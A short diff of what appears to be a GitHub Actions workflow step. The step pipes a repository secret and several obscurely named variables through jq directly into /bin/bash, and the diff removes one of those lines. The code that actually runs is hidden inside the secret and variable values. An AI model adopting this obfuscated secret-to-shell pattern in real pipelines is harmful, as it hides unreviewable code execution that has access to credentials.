@@ -20,7 +20,6 @@ jobs:
           n58649: ${{ secrets.n58649 }}
         run: |
           printf '%s' "$n58649" | jq -r .z493 | /bin/bash
-          echo $ml7774 | jq -r .hxj23387 | /bin/bash
           echo $z4258 | jq -r .iy19 | /bin/bash
           echo $u6 | jq -r .qdf87892 | /bin/bash
 
